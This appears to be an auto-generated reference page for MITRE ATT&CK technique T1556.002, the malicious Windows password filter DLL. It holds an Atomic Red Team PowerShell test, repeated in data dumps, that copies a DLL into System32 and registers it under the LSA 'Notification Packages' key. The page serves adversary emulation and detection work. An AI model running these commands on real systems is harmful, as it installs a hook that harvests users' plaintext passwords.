
# Password Filter DLL

## Description

### MITRE Description

> Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. 

Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. 

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1556/002

## Potential Commands

```
$passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
Restart-Computer -Confirm
```

## Commands Dataset

```
[{'command': '$passwordFilterName = (Copy-Item '
             '"PathToAtomicsFolder\\T1556.002\\src\\AtomicPasswordFilter.dll" '
             '-Destination "C:\\Windows\\System32" -PassThru).basename\n'
             '$lsaKey = Get-Item '
             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"\n'
             '$notificationPackagesValues = $lsaKey.GetValue("Notification '
             'Packages")\n'
             '$notificationPackagesValues += $passwordFilterName\n'
             'Set-ItemProperty '
             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\" "Notification '
             'Packages" $notificationPackagesValues\n'
             'Restart-Computer -Confirm\n',
  'name': None,
  'source': 'atomics/T1556.002/T1556.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Modify Authentication Process: Password Filter DLL': {'atomic_tests': [{'auto_generated_guid': 'a7961770-beb5-4134-9674-83d7e1fa865c',
                                                                                                  'dependencies': [{'description': 'AtomicPasswordFilter.dll '
                                                                                                                                   'must '
                                                                                                                                   'exist '
                                                                                                                                   'on '
                                                                                                                                   'disk '
                                                                                                                                   'at '
                                                                                                                                   'specified '
                                                                                                                                   'location '
                                                                                                                                   '(#{input_dll})\n',
                                                                                                                    'get_prereq_command': 'Write-Host '
                                                                                                                                          '"You '
                                                                                                                                          'must '
                                                                                                                                          'provide '
                                                                                                                                          'your '
                                                                                                                                          'own '
                                                                                                                                          'password '
                                                                                                                                          'filter '
                                                                                                                                          'dll"\n',
                                                                                                                    'prereq_command': 'if '
                                                                                                                                      '(Test-Path '
                                                                                                                                      '#{input_dll}) '
                                                                                                                                      '{exit '
                                                                                                                                      '0} '
                                                                                                                                      'else '
                                                                                                                                      '{exit '
                                                                                                                                      '1}\n'}],
                                                                                                  'dependency_executor_name': 'powershell',
                                                                                                  'description': 'Uses '
                                                                                                                 'PowerShell '
                                                                                                                 'to '
                                                                                                                 'install '
                                                                                                                 'and '
                                                                                                                 'register '
                                                                                                                 'a '
                                                                                                                 'password '
                                                                                                                 'filter '
                                                                                                                 'DLL. '
                                                                                                                 'Requires '
                                                                                                                 'a '
                                                                                                                 'reboot '
                                                                                                                 'and '
                                                                                                                 'administrative '
                                                                                                                 'privileges.\n',
                                                                                                  'executor': {'command': '$passwordFilterName '
                                                                                                                          '= '
                                                                                                                          '(Copy-Item '
                                                                                                                          '"#{input_dll}" '
                                                                                                                          '-Destination '
                                                                                                                          '"C:\\Windows\\System32" '
                                                                                                                          '-PassThru).basename\n'
                                                                                                                          '$lsaKey '
                                                                                                                          '= '
                                                                                                                          'Get-Item '
                                                                                                                          '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"\n'
                                                                                                                          '$notificationPackagesValues '
                                                                                                                          '= '
                                                                                                                          '$lsaKey.GetValue("Notification '
                                                                                                                          'Packages")\n'
                                                                                                                          '$notificationPackagesValues '
                                                                                                                          '+= '
                                                                                                                          '$passwordFilterName\n'
                                                                                                                          'Set-ItemProperty '
                                                                                                                          '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\" '
                                                                                                                          '"Notification '
                                                                                                                          'Packages" '
                                                                                                                          '$notificationPackagesValues\n'
                                                                                                                          'Restart-Computer '
                                                                                                                          '-Confirm\n',
                                                                                                               'elevation_required': True,
                                                                                                               'name': 'powershell'},
                                                                                                  'input_arguments': {'input_dll': {'default': 'PathToAtomicsFolder\\T1556.002\\src\\AtomicPasswordFilter.dll',
                                                                                                                                    'description': 'Path '
                                                                                                                                                   'to '
                                                                                                                                                   'DLL '
                                                                                                                                                   'to '
                                                                                                                                                   'be '
                                                                                                                                                   'installed '
                                                                                                                                                   'and '
                                                                                                                                                   'registered',
                                                                                                                                    'type': 'Path'}},
                                                                                                  'name': 'Install '
                                                                                                          'and '
                                                                                                          'Register '
                                                                                                          'Password '
                                                                                                          'Filter '
                                                                                                          'DLL',
                                                                                                  'supported_platforms': ['windows']}],
                                                                                'attack_technique': 'T1556.002',
                                                                                'display_name': 'Modify '
                                                                                                'Authentication '
                                                                                                'Process: '
                                                                                                'Password '
                                                                                                'Filter '
                                                                                                'DLL'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)

* [Defense Evasion](../tactics/Defense-Evasion.md)
    

# Mitigations


* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)


# Actors


* [Strider](../actors/Strider.md)

